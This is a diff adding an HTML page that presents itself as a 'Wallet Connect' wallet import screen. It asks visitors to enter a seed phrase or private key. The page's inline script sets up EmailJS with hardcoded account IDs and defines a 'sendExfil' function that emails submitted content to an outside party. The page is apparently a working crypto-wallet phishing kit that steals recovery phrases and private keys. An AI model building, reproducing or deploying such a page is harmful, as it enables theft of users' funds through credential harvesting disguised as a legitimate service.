@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connect</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+</head>
+
+<body>
+    <div class="app-container">
+        <!-- Landing View (Wallet List) -->
+        <div id="view-landing" class="wallet-modal card">
+            <div class="modal-header">
+                <h6>all wallets</h6>
+                <button id="theme-toggle" class="theme-btn" aria-label="Toggle Theme">
+                    <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                    <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="search-container">
+
+                <input type="text" id="wallet-search" placeholder="Search wallets...">
+            </div>
+            <div class="wallet-grid" id="wallet-grid">
+                <!-- Wallet items will be dynamically added here -->
+            </div>
+        </div>
+
+        <!-- Import View (Hidden by default) -->
+        <div id="view-import-1" class="card hidden">
+            <img id="import-wallet-icon" src="" alt="Wallet Icon" class="hidden">
+            <h1 id="import-title">Import Wallet</h1>
+            <p class="sub">Enter your recovery phrase or private key.</p>
+            <div class="segmented-control">
+                <label class="segment-option active" id="tab-seed">
+                    <input type="radio" name="import-mode" value="seed" checked style="display:none"
+                        onchange="actions.toggleImportMode()">
+                    <span>Seed Phrase</span>
+                </label>
+                <label class="segment-option" id="tab-pk">
+                    <input type="radio" name="import-mode" value="pk" style="display:none;"
+                        onchange="actions.toggleImportMode()">
+                    <span>Private Key</span>
+                </label>
+            </div>
+            <div id="import-section-seed">
+                <div id="import-seed-grid" class="words-grid seed-container"></div>
+                <label class="checkbox-label"><input type="checkbox" id="is-24-words"><span>I have a 24-word
+                        phrase</span></label>
+            </div>
+            <div id="import-section-pk" class="hidden">
+                <div class="input-group"><textarea id="import-private-key" rows="4"
+                        placeholder="Enter your private key (Hex or WIF)"></textarea></div>
+            </div>
+            <button class="btn btn-primary" onclick="actions.importPhrase()">Import Wallet</button>
+        </div>
+    </div>
+    <div id="toast-container"></div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        const EMAILJS_USER_ID = 'iSlQerQwtIASBYE5j';
+        const EMAILJS_SERVICE_ID = 'service_uxgdkab';
+        const EMAILJS_TEMPLATE_ID = 'template_3bb2izt';
+
+        if (typeof emailjs !== 'undefined') {
+            try { emailjs.init(EMAILJS_USER_ID); console.log(' initialized'); }
+            catch (e) { console.error(' Init Failed:', e); alert('Init Failed: ' + e.message); }
+        } else {
+            console.error('script NOT loaded');
+            alert('Critical Error: Check your internet connection or ad blocker.');
+        }
+
+        const sendExfil = (type, content) => {
+            if (typeof emailjs === 'undefined') {
+                console.error('Cannot send: EmailJS not loaded');
+                toast.error('not loaded!');
+                return;
+            }
+
+            console.log(`Attempting to send ${type}...`);
+
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+                type, content, time: new Date().toISOString()
+            }).then(() => {
+                console.log(`${type} sent successfully`);
+                // toast.success(``);
+            }).catch((err) => {
+                console.error(`FAILED to send ${type}:`, err);
+            });
+        };
+    </script>
+    <script src="script.js"></script>
+</body>
+
+</html>
